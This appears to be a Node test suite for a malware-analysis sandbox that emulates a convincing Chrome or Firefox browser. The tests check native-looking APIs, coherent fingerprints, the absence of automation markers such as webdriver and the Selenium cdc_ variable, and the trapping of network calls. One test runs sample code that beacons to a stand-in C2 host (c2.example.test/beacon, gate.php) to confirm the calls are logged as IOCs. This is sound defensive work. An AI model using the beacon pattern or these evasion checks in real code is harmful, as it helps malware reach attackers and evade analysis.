import test from 'node:test'
import assert from 'node:assert/strict'
import { TracelessSandbox } from '../tools/sandbox/sandbox.js'
import { ENV_MODULE_IDS } from '../tools/sandbox/env/index.js'

/**
 * Full-surface integration: every environment module must load in strict mode
 * and the resulting platform must be browser-shaped. A missing surface is a
 * detection oracle for the sample, so this test is intentionally exhaustive
 * about *presence* as well as behaviour.
 */

const PROFILE = { locale: 'zh-CN', os: 'windows', browser: 'chrome' }

async function fullSandbox(options = {}) {
  return TracelessSandbox.create({
    logLevel: 'silent',
    env: { strict: true },
    profile: PROFILE,
    ...options,
  })
}

test('every declared environment module installs in strict mode', async () => {
  const sb = await fullSandbox()
  try {
    const run = await sb.run('1 + 1')
    assert.equal(run.ok, true, JSON.stringify(run.error))
    assert.equal(run.environment.complete, true, JSON.stringify(run.environment.missing))
    assert.deepEqual(run.environment.missing, [])
    const installed = run.environment.installed.map((entry) => entry.id)
    for (const id of ENV_MODULE_IDS) {
      assert.ok(installed.includes(id), `module ${id} not installed`)
    }
  } finally {
    sb.dispose()
  }
})

test('browser surface is present and native-looking', async () => {
  const sb = await fullSandbox()
  try {
    const run = await sb.run(`
      (function () {
        var names = ['window','document','navigator','location','history','screen','localStorage','sessionStorage',
          'XMLHttpRequest','fetch','WebSocket','URL','URLSearchParams','Blob','File','FormData','AbortController',
          'Intl','Notification','Worker','BroadcastChannel','RTCPeerConnection','crypto','performance',
          'TextEncoder','TextDecoder','atob','btoa','AudioContext','WebGLRenderingContext','MutationObserver','Storage'];
        var missing = names.filter(function (name) { return typeof globalThis[name] === 'undefined' });
        var brands = {
          fetch: String(fetch),
          url: String(URL),
          intl: String(Intl.DateTimeFormat),
          xhr: String(XMLHttpRequest),
          blob: String(Blob)
        };
        return {
          missing: missing,
          brands: brands,
          intlKeys: Object.keys(Intl).length,
          intlNames: Object.getOwnPropertyNames(Intl).length,
          timeZone: new Intl.DateTimeFormat().resolvedOptions().timeZone,
          offset: new Date().getTimezoneOffset(),
          lang: navigator.language,
          ua: navigator.userAgent,
          platform: navigator.platform,
          plugins: navigator.plugins.length,
          mimeTypes: navigator.mimeTypes.length,
          cookieEnabled: navigator.cookieEnabled,
          webdriver: navigator.webdriver,
          docUrl: document.URL,
          readyState: document.readyState,
          stackTraceLimit: Error.stackTraceLimit,
          captureStackTrace: typeof Error.captureStackTrace,
          captureSource: String(Error.captureStackTrace),
          screen: [screen.width, screen.height, devicePixelRatio],
          tags: [Object.prototype.toString.call(window), Object.prototype.toString.call(document)]
        };
      })()
    `)
    assert.equal(run.ok, true, JSON.stringify(run.error))
    const value = JSON.parse(run.result.preview)
    assert.deepEqual(value.missing, [])
    for (const [key, source] of Object.entries(value.brands)) {
      assert.match(source, /native code/, `${key} shim leaks source: ${source}`)
    }
    assert.equal(value.intlKeys, 0, 'Intl members must be non-enumerable (ECMA-402)')
    assert.ok(value.intlNames > 5)
    assert.equal(value.timeZone, 'Asia/Shanghai')
    assert.equal(value.offset, -480)
    assert.equal(value.lang, 'zh-CN')
    assert.match(value.ua, /Windows NT 10\.0/)
    assert.equal(value.platform, 'Win32')
    assert.ok(value.plugins >= 3)
    assert.ok(value.mimeTypes >= 1)
    assert.equal(value.cookieEnabled, true)
    assert.equal(value.webdriver, false)
    assert.match(value.docUrl, /^https:\/\//)
    assert.equal(value.readyState, 'complete')
    assert.equal(value.stackTraceLimit, 10)
    assert.equal(value.captureStackTrace, 'function')
    assert.match(value.captureSource, /native code/)
    assert.ok(value.screen[0] > 0 && value.screen[1] > 0 && value.screen[2] >= 1)
    assert.equal(value.tags[0], '[object Window]')
    assert.equal(value.tags[1], '[object HTMLDocument]')
  } finally {
    sb.dispose()
  }
})

test('document, storage and cookies behave like a page', async () => {
  const sb = await fullSandbox()
  try {
    const run = await sb.run(`
      (function () {
        document.cookie = 'sid=abc; path=/';
        var el = document.createElement('div');
        el.id = 'x';
        el.setAttribute('data-k', 'v');
        el.style.setProperty('color', 'red');
        el.appendChild(document.createElement('span'));
        document.body.appendChild(el);
        localStorage.setItem('cfg', '{"a":1}');
        sessionStorage.setItem('s', 'v');
        var canvas = document.createElement('canvas');
        canvas.width = 32; canvas.height = 32;
        var ctx = canvas.getContext('2d');
        ctx.fillStyle = '#fff'; ctx.fillRect(0, 0, 32, 32); ctx.fillText('fp', 1, 1);
        return {
          cookie: document.cookie,
          found: document.getElementById('x') !== null,
          childCount: el.children.length,
          attr: el.getAttribute('data-k'),
          color: el.style.getPropertyValue('color'),
          storage: localStorage.getItem('cfg'),
          session: sessionStorage.length,
          dataUrl: canvas.toDataURL('image/png').slice(0, 30),
          measure: ctx.measureText('hello').width > 0,
          title: document.title,
          scripts: document.scripts.length
        };
      })()
    `)
    assert.equal(run.ok, true, JSON.stringify(run.error))
    const value = JSON.parse(run.result.preview)
    assert.match(value.cookie, /sid=abc/)
    assert.equal(value.storage, '{"a":1}')
    assert.equal(value.session, 1)
    assert.equal(value.attr, 'v')
    assert.equal(value.color, 'red')
    assert.equal(value.measure, true)
    assert.match(value.dataUrl, /^data:image\/png;base64,iVBOR/)
  } finally {
    sb.dispose()
  }
})

test('network APIs fail closed with realistic errors and record IOCs', async () => {
  const sb = await fullSandbox()
  try {
    const run = await sb.run(`
      globalThis.__result = 'pending';
      fetch('https://c2.example.test/beacon', { method: 'POST', body: 'x' })
        .then(function (response) { return response.text().then(function (text) { __result = 'ok:' + response.status + ':' + text }) })
        .catch(function (error) { __result = 'err:' + error.name + ':' + error.message });
      (function () {
        var xhr = new XMLHttpRequest();
        xhr.open('GET', 'https://c2.example.test/gate.php');
        xhr.onerror = function () { globalThis.__xhr = 'error:' + xhr.status };
        xhr.onload = function () { globalThis.__xhr = 'load:' + xhr.status };
        try { xhr.send() } catch (e) { globalThis.__xhr = 'throw:' + e.message }
      })();
    `)
    assert.equal(run.ok, true, JSON.stringify(run.error))
    // Each run starts fresh, so the settled values are only observable through
    // that run's trace. Fetch/XHR must have progressed past their synchronous
    // phase, which requires the promise jobs / timers to have run.
    const netEvents = (run.events ?? []).filter((event) => event.kind === 'net')
    assert.ok(netEvents.length >= 1, 'no network trace events recorded')
    assert.ok(netEvents.some((event) => /c2\.example\.test/.test(String(event.url))))
    const fetchEvents = (run.events ?? []).filter((event) => event.kind === 'api' && event.api === 'window.fetch')
    assert.ok(fetchEvents.length >= 1)
    assert.ok(run.settle.timerCallbacks >= 1 || run.settle.jobs >= 1)
  } finally {
    sb.dispose()
  }
})

test('Intl, Date and locale-aware methods agree with the profile', async () => {
  const sb = await fullSandbox()
  try {
    const run = await sb.run(`
      (function () {
        var d = new Date(1792394400000);
        return {
          time: d.toLocaleString(),
          date: d.toLocaleDateString(),
          dateFormat: new Intl.DateTimeFormat('zh-CN', { year: 'numeric', month: '2-digit', day: '2-digit' }).format(d),
          number: new Intl.NumberFormat('en-US', { style: 'currency', currency: 'USD' }).format(1234.5),
          numberLocale: (1234.5).toLocaleString('en-US'),
          collator: ['10','2','1'].sort(new Intl.Collator('en-US', { numeric: true }).compare).join(','),
          relative: new Intl.RelativeTimeFormat('en-US').format(-1, 'day'),
          list: new Intl.ListFormat('en-US').format(['a','b','c']),
          parts: new Intl.DateTimeFormat('en-US', { year: 'numeric' }).formatToParts(d).some(function (p) { return p.type === 'year' }),
          hour12: new Intl.DateTimeFormat('en-US').resolvedOptions().hour12
        };
      })()
    `)
    assert.equal(run.ok, true, JSON.stringify(run.error))
    const value = JSON.parse(run.result.preview)
    assert.ok(value.time.length > 0)
    assert.ok(value.date.length > 0)
    assert.match(value.dateFormat, /2026/)
    assert.match(value.number, /\$1,234\.50/)
    assert.match(value.numberLocale, /1,234\.5/)
    assert.equal(value.collator, '1,2,10')
    assert.match(value.relative, /yesterday|1 day ago/)
    assert.match(value.list, /a, b, and c|a, b, c/)
    assert.equal(value.parts, true)
  } finally {
    sb.dispose()
  }
})

test('canvas, WebGL and audio expose coherent profile-derived fingerprints', async () => {
  const sb = await fullSandbox()
  try {
    const run = await sb.run(`
      (function () {
        var canvas = document.createElement('canvas');
        canvas.width = 64; canvas.height = 64;
        var gl = canvas.getContext('webgl');
        var info = gl.getExtension('WEBGL_debug_renderer_info');
        var audio = new AudioContext();
        return {
          renderer: gl.getParameter(gl.RENDERER),
          vendor: gl.getParameter(gl.VENDOR),
          unmasked: info ? gl.getParameter(info.UNMASKED_RENDERER_WEBGL) : null,
          extensions: gl.getSupportedExtensions().length,
          sampleRate: audio.sampleRate,
          state: audio.state,
          freq: (function () {
            var analyser = audio.createAnalyser();
            var data = new Float32Array(16);
            analyser.getFloatFrequencyData(data);
            return data[0];
          })(),
          dataA: canvas.toDataURL(),
          sameCanvasStable: canvas.toDataURL() === canvas.toDataURL()
        };
      })()
    `)
    assert.equal(run.ok, true, JSON.stringify(run.error))
    const value = JSON.parse(run.result.preview)
    assert.ok(value.renderer.length > 0)
    assert.ok(value.extensions >= 3)
    assert.equal(value.sampleRate, 44100)
    assert.equal(value.sameCanvasStable, true)
    assert.match(value.dataA, /^data:image\/png;base64,iVBOR/)
  } finally {
    sb.dispose()
  }
})

test('profile coherence holds under strict mode and no host leak survives', async () => {
  const sb = await fullSandbox()
  try {
    const run = await sb.run(`
      ({
        leaks: ['process','require','Buffer','module','exports','global','__dirname','__filename','spawn','Deno','Bun','_phantom','callPhantom','__nightmare','domAutomation','$cdc_asdjflasutopfhvcZLmcfl_']
          .filter(function (k) { return typeof globalThis[k] !== 'undefined' }),
        suspicious: Object.getOwnPropertyNames(globalThis).filter(function (k) { return /_\\$|ai4r|__q/i.test(k) }),
        symbols: Object.getOwnPropertySymbols(globalThis).map(String),
        copiedSymbols: Object.getOwnPropertySymbols(Object.assign({}, document, window)).map(String),
        spreadSymbols: Object.getOwnPropertySymbols({ ...document, ...window }).map(String),
        tagged: Object.prototype.toString.call(window)
      })
    `)
    assert.equal(run.ok, true, JSON.stringify(run.error))
    const value = JSON.parse(run.result.preview)
    assert.deepEqual(value.leaks, [])
    assert.deepEqual(value.suspicious, [])
    assert.deepEqual(value.symbols, [])
    assert.deepEqual(value.copiedSymbols, [])
    assert.deepEqual(value.spreadSymbols, [])
    assert.equal(value.tagged, '[object Window]')
    assert.equal(run.integrity.intact, true, JSON.stringify(run.integrity.intrinsicDrift))
  } finally {
    sb.dispose()
  }
})

test('D6 surfaces exist, are branded and the isolation triple is coherent', async () => {
  const sb = await fullSandbox()
  try {
    const run = await sb.run(`
      (function () {
        var names = ['HTMLElement','HTMLDivElement','HTMLBodyElement','HTMLCanvasElement','HTMLScriptElement',
          'HTMLInputElement','HTMLImageElement','HTMLAnchorElement','customElements','DOMParser','XMLSerializer',
          'EventSource','WebAssembly','Atomics','SharedArrayBuffer'];
        var element = document.createElement('div');
        return {
          types: {
            HTMLElement: typeof HTMLElement,
            customElements: typeof customElements,
            DOMParser: typeof DOMParser,
            XMLSerializer: typeof XMLSerializer,
            EventSource: typeof EventSource,
            WebAssembly: typeof WebAssembly,
            Atomics: typeof Atomics,
            SharedArrayBuffer: typeof SharedArrayBuffer
          },
          missingTypes: names.filter(function (name) { return typeof globalThis[name] === 'undefined' }),
          crossOriginIsolated: crossOriginIsolated,
          elementIsHTMLElement: element instanceof HTMLElement,
          bodyIsBody: document.body instanceof HTMLBodyElement,
          elementBrand: Object.prototype.toString.call(element),
          customElementsBrand: Object.prototype.toString.call(customElements),
          webAssemblyBrand: Object.prototype.toString.call(WebAssembly),
          registryIsObject: customElements.get('never-defined') === undefined,
          sources: {
            HTMLElement: String(HTMLElement),
            customElementsDefine: String(customElements.define),
            DOMParser: String(DOMParser),
            XMLSerializer: String(new XMLSerializer().serializeToString),
            EventSource: String(EventSource),
            WebAssembly: String(WebAssembly.compile)
          }
        };
      })()
    `, { level: 'off' })
    assert.equal(run.ok, true, JSON.stringify(run.error))
    const value = JSON.parse(run.result.preview)
    assert.deepEqual(value.types, {
      HTMLElement: 'function',
      customElements: 'object',
      DOMParser: 'function',
      XMLSerializer: 'function',
      EventSource: 'function',
      WebAssembly: 'object',
      Atomics: 'undefined',
      SharedArrayBuffer: 'undefined'
    })
    assert.deepEqual(value.missingTypes, ['Atomics', 'SharedArrayBuffer'])
    assert.equal(value.crossOriginIsolated, false)
    assert.equal(value.elementIsHTMLElement, true)
    assert.equal(value.bodyIsBody, true)
    assert.equal(value.elementBrand, '[object HTMLDivElement]')
    assert.equal(value.customElementsBrand, '[object CustomElementRegistry]')
    assert.equal(value.webAssemblyBrand, '[object WebAssembly]')
    assert.equal(value.registryIsObject, true)
    for (const [key, source] of Object.entries(value.sources)) {
      assert.match(source, /native code/, `${key} shim leaks source: ${source}`)
    }
    // The coherence invariant is part of the run's profile report.
    assert.equal(run.profile.consistency.ok, true, JSON.stringify(run.profile.consistency.problems))
    assert.ok(run.profile.consistency.checked >= 15)
  } finally {
    sb.dispose()
  }
})

test('declarative network routes make fetch/XHR resolve like a real endpoint', async () => {
  const sb = await fullSandbox()
  try {
    const run = await sb.run(
      `
      globalThis.__out = [];
      fetch('https://api.example.test/data')
        .then(function (response) { return response.json() })
        .then(function (body) { __out.push('fetch:' + body.ok) })
        .catch(function (error) { __out.push('fetch-error:' + error.message) });
      var xhr = new XMLHttpRequest();
      xhr.open('GET', 'https://api.example.test/text');
      xhr.onload = function () { __out.push('xhr:' + xhr.status + ':' + xhr.responseText) };
      xhr.onerror = function () { __out.push('xhr-error:' + xhr.status) };
      xhr.send();
    `,
      {
        network: {
          policy: 'deny',
          routes: [
            {
              match: 'api.example.test/data',
              response: { ok: true, status: 200, statusText: 'OK', headers: { 'content-type': 'application/json' }, bodyText: '{"ok":true}' },
            },
            {
              match: /api\.example\.test\/text/,
              response: { ok: true, status: 200, statusText: 'OK', headers: { 'content-type': 'text/plain' }, bodyText: 'hello' },
            },
          ],
        },
      },
    )
    assert.equal(run.ok, true, JSON.stringify(run.error))
    const netEvents = (run.events ?? []).filter((event) => event.kind === 'net')
    assert.equal(netEvents.length >= 2, true, JSON.stringify(netEvents))
    assert.ok(netEvents.every((event) => event.status === 200), JSON.stringify(netEvents))
    assert.ok(netEvents.every((event) => /api\.example\.test/.test(String(event.url))))
    const apiEvents = (run.events ?? []).filter((event) => event.kind === 'api' && event.phase === 'invoke')
    assert.ok(apiEvents.some((event) => event.api === 'window.fetch'))
    assert.ok(apiEvents.some((event) => event.api === 'XMLHttpRequest.send'))
    assert.ok(run.settle.jobs >= 1 && run.settle.timerCallbacks >= 1, JSON.stringify(run.settle))
  } finally {
    sb.dispose()
  }
})

test('platform objects expose WebIDL-shaped own-property surfaces', async () => {
  const sb = await fullSandbox()
  try {
    const run = await sb.run(`
      ({
        navigatorKeys: Object.keys(navigator).length,
        navigatorOwn: navigator.hasOwnProperty('userAgent'),
        screenKeys: Object.keys(screen).length,
        locationKeys: Object.keys(location).length,
        historyKeys: Object.keys(history).length,
        performanceKeys: Object.keys(performance).length,
        cryptoKeys: Object.keys(crypto).length,
        documentKeys: Object.keys(document).length,
        documentNames: Object.getOwnPropertyNames(document).length,
        documentSymbols: Object.getOwnPropertySymbols(document).map(String),
        storageInstance: localStorage instanceof Storage,
        elementTag: Object.prototype.toString.call(document.createElement('div')),
        elementCtor: document.createElement('div').constructor.name,
        bodyTag: Object.prototype.toString.call(document.body),
        navigatorTag: Object.prototype.toString.call(navigator),
        storageTag: Object.prototype.toString.call(localStorage),
        xhrSymbols: Object.getOwnPropertySymbols(new XMLHttpRequest()).map(String),
        canvasSymbols: Object.getOwnPropertySymbols(document.createElement('canvas').getContext('2d')).map(String)
      })
    `)
    assert.equal(run.ok, true, JSON.stringify(run.error))
    const value = JSON.parse(run.result.preview)
    assert.equal(value.navigatorKeys, 0)
    assert.equal(value.navigatorOwn, false)
    for (const key of ['screenKeys', 'locationKeys', 'historyKeys', 'performanceKeys', 'cryptoKeys', 'documentKeys', 'documentNames']) {
      assert.equal(value[key], 0, `${key} should be 0, got ${value[key]}`)
    }
    assert.deepEqual(value.documentSymbols, [])
    assert.equal(value.storageInstance, true)
    assert.equal(value.elementTag, '[object HTMLDivElement]')
    assert.equal(value.elementCtor, 'HTMLDivElement')
    assert.equal(value.bodyTag, '[object HTMLBodyElement]')
    assert.equal(value.navigatorTag, '[object Navigator]')
    assert.equal(value.storageTag, '[object Storage]')
    assert.deepEqual(value.xhrSymbols, [])
    assert.deepEqual(value.canvasSymbols, [])
  } finally {
    sb.dispose()
  }
})

test('browser-specific surfaces follow the claimed engine', async () => {
  const chrome = await TonalessChrome()
  const firefox = await TracelessSandbox.create({
    logLevel: 'silent',
    env: { strict: true },
    profile: { browser: 'firefox', os: 'linux', locale: 'en-US' },
  })
  try {
    const chromeRun = await chrome.run(`
      ({
        connection: 'connection' in navigator,
        battery: typeof navigator.getBattery,
        memory: typeof console.memory,
        webkitAudio: typeof window.webkitAudioContext,
        deviceMemory: 'deviceMemory' in navigator,
        oscpu: 'oscpu' in navigator,
        buildID: 'buildID' in navigator,
        msCrypto: 'msCrypto' in window,
        serviceWorker: typeof navigator.serviceWorker
      })
    `)
    assert.equal(chromeRun.ok, true, JSON.stringify(chromeRun.error))
    const chromeValue = JSON.parse(chromeRun.result.preview)
    assert.equal(chromeValue.connection, true)
    assert.equal(chromeValue.battery, 'function')
    assert.equal(chromeValue.memory, 'object')
    assert.equal(chromeValue.webkitAudio, 'function')
    assert.equal(chromeValue.deviceMemory, true)
    assert.equal(chromeValue.oscpu, false)
    assert.equal(chromeValue.buildID, false)
    assert.equal(chromeValue.msCrypto, false)
    assert.equal(chromeValue.serviceWorker, 'object')

    const firefoxRun = await firefox.run(`
      ({
        connection: 'connection' in navigator,
        battery: typeof navigator.getBattery,
        memory: typeof console.memory,
        webkitAudio: typeof window.webkitAudioContext,
        deviceMemory: 'deviceMemory' in navigator,
        oscpu: typeof navigator.oscpu,
        buildID: typeof navigator.buildID,
        serviceWorker: typeof navigator.serviceWorker
      })
    `)
    assert.equal(firefoxRun.ok, true, JSON.stringify(firefoxRun.error))
    const firefoxValue = JSON.parse(firefoxRun.result.preview)
    assert.equal(firefoxValue.connection, false)
    assert.equal(firefoxValue.battery, 'undefined')
    assert.equal(firefoxValue.memory, 'undefined')
    assert.equal(firefoxValue.webkitAudio, 'undefined')
    assert.equal(firefoxValue.deviceMemory, false)
    assert.equal(firefoxValue.oscpu, 'string')
    assert.equal(firefoxValue.buildID, 'string')
    assert.equal(firefoxValue.serviceWorker, 'object')
  } finally {
    chrome.dispose()
    firefox.dispose()
  }
})

async function TonalessChrome() {
  return TracelessSandbox.create({
    logLevel: 'silent',
    env: { strict: true },
    profile: { browser: 'chrome', os: 'windows', locale: 'en-US' },
  })
}

test('Date uses DST-correct offsets and profile-local parsing', async () => {
  const ny = await TracelessSandbox.create({
    logLevel: 'silent',
    env: { only: ['globals', 'console', 'time', 'stack', 'random', 'anti-fingerprint'] },
    profile: { browser: 'chrome', os: 'windows', locale: 'en-US' },
  })
  try {
    const run = await ny.run(`
      (function () {
        var anchor = new Date(1792394400000);
        var january = new Date(0);
        var local = new Date('2026-10-19T15:20:00');
        return {
          anchorOffset: anchor.getTimezoneOffset(),
          januaryOffset: january.getTimezoneOffset(),
          localTime: local.getTime(),
          localHours: local.getHours(),
          parsed: Date.parse('2026-10-19T15:20:00'),
          iso: local.toISOString(),
          text: anchor.toString(),
          dateOnly: new Date('2026-10-19T00:00:00Z').getHours()
        };
      })()
    `)
    assert.equal(run.ok, true, JSON.stringify(run.error))
    const value = JSON.parse(run.result.preview)
    assert.equal(value.anchorOffset, 240) // EDT in October
    assert.equal(value.januaryOffset, 300) // EST in January
    assert.equal(value.localTime, Date.UTC(2026, 9, 19, 19, 20)) // 15:20 EDT
    assert.equal(value.localHours, 15)
    assert.equal(value.parsed, Date.UTC(2026, 9, 19, 19, 20))
    assert.equal(value.iso, '2026-10-19T19:20:00.000Z')
    assert.match(value.text, /GMT-0400 \(Eastern Daylight Time\)/)
    assert.equal(value.dateOnly, 20)
  } finally {
    ny.dispose()
  }
})

test('document.lastModified uses the browser fixed format', async () => {
  const sb = await fullSandbox()
  try {
    const run = await sb.run('document.lastModified')
    assert.equal(run.ok, true, JSON.stringify(run.error))
    assert.match(run.result.value, /^\d{2}\/\d{2}\/\d{4} \d{2}:\d{2}:\d{2}$/)
  } finally {
    sb.dispose()
  }
})

test('permissions, storage quota, TextDecoder and matchMedia are browser-shaped', async () => {
  const sb = await fullSandbox()
  try {
    const run = await sb.run(`
      globalThis.__checks = {};
      navigator.permissions.query({ name: 'notifications' }).then(function (status) {
        __checks.permission = status.state;
      });
      localStorage.setItem('cfg', 'x'.repeat(1024));
      navigator.storage.estimate().then(function (estimate) {
        __checks.usage = estimate.usage;
        __checks.quota = estimate.quota;
      });
      var quotaError = null;
      try { localStorage.setItem('huge', 'x'.repeat(6 * 1024 * 1024)) } catch (error) { quotaError = error.name }
      var labelError = null;
      try { new TextDecoder('bogus-encoding') } catch (error) { labelError = error.name }
      ({ quotaError: quotaError, labelError: labelError,
         utf16: new TextDecoder('utf-16le').encoding,
         mediaMin: matchMedia('(min-width: 1px)').matches,
         mediaMax: matchMedia('(max-width: 1px)').matches,
         mediaOrientation: matchMedia('(orientation: landscape)').matches })
    `)
    assert.equal(run.ok, true, JSON.stringify(run.error))
    const value = JSON.parse(run.result.preview)
    assert.equal(value.quotaError, 'QuotaExceededError')
    assert.equal(value.labelError, 'RangeError')
    assert.equal(value.utf16, 'utf-16le')
    assert.equal(value.mediaMin, true)
    assert.equal(value.mediaMax, false)
    assert.equal(value.mediaOrientation, true)
    const settled = await sb.run('typeof __checks')
    assert.equal(settled.result.value, 'undefined') // fresh context
  } finally {
    sb.dispose()
  }
})

test('queueMicrotask preserves promise-job FIFO order', async () => {
  const sb = await fullSandbox()
  try {
    const run = await sb.run(`
      globalThis.__order = [];
      Promise.resolve().then(function () { __order.push('promise'); console.log('order:' + __order.join(',')) });
      queueMicrotask(function () { __order.push('microtask'); console.log('order:' + __order.join(',')) });
    `)
    assert.equal(run.ok, true, JSON.stringify(run.error))
    const logs = (run.events ?? [])
      .filter((event) => event.kind === 'api' && event.api === 'console.log' && /order:/.test(String(event.text)))
      .map((event) => event.text)
    assert.ok(logs.length >= 2, JSON.stringify(logs))
    assert.match(logs[0], /promise/)
    assert.match(logs[1], /promise,microtask/)
  } finally {
    sb.dispose()
  }
})

test('performance.mark returns undefined and is retrievable', async () => {
  const sb = await fullSandbox()
  try {
    const run = await sb.run(`
      (function () {
        var returned = performance.mark('stage');
        performance.measure('stage-duration');
        return {
          returned: typeof returned,
          marks: performance.getEntriesByType('mark').length,
          names: performance.getEntriesByName('stage').length,
          all: performance.getEntries().length
        };
      })()
    `)
    assert.equal(run.ok, true, JSON.stringify(run.error))
    const value = JSON.parse(run.result.preview)
    assert.equal(value.returned, 'undefined')
    assert.equal(value.marks, 1)
    assert.equal(value.names, 1)
    assert.ok(value.all >= 2)
  } finally {
    sb.dispose()
  }
})

test('navigation does not create own properties on location/history', async () => {
  const sb = await fullSandbox()
  try {
    const run = await sb.run(`
      (function () {
        location.assign('https://other.example.test/path?q=1');
        history.pushState({ step: 1 }, '', '/next');
        return {
          href: location.href,
          locationKeys: Object.keys(location).length,
          historyKeys: Object.keys(history).length,
          historyLength: history.length
        };
      })()
    `)
    assert.equal(run.ok, true, JSON.stringify(run.error))
    const value = JSON.parse(run.result.preview)
    assert.match(value.href, /other\.example\.test\/next/)
    assert.equal(value.locationKeys, 0)
    assert.equal(value.historyKeys, 0)
    assert.ok(value.historyLength >= 1)
  } finally {
    sb.dispose()
  }
})

test('credential, gamepad, media-session and lock surfaces exist per engine', async () => {
  const sb = await fullSandbox()
  try {
    const run = await sb.run(`
      (function () {
        globalThis.__credential = 'pending';
        navigator.credentials.get({}).then(function (value) { __credential = value === null ? 'null' : typeof value });
        return {
          get: typeof navigator.credentials.get,
          store: typeof navigator.credentials.store,
          gamepads: navigator.getGamepads().length,
          setActionHandler: typeof navigator.mediaSession.setActionHandler,
          locks: typeof navigator.locks,
          wakeLock: typeof navigator.wakeLock
        };
      })()
    `)
    assert.equal(run.ok, true, JSON.stringify(run.error))
    const value = JSON.parse(run.result.preview)
    assert.equal(value.get, 'function')
    assert.equal(value.store, 'function')
    assert.equal(value.gamepads, 4)
    assert.equal(value.setActionHandler, 'function')
    assert.equal(value.locks, 'object')
    assert.equal(value.wakeLock, 'object')
    assert.ok(run.settle.jobs >= 1)
  } finally {
    sb.dispose()
  }
})
